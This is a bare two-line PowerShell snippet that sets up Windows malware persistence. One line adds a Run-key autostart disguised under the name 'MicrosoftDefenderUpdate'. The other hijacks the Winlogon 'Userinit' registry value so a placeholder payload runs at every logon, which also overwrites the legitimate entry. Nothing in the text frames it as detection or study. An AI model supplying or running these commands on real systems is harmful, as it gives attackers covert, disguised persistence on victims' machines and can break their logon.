Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftDefenderUpdate" -Value "C:\Path\To\YourScript.ps1"

Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Path\To\YourPayload.exe,"
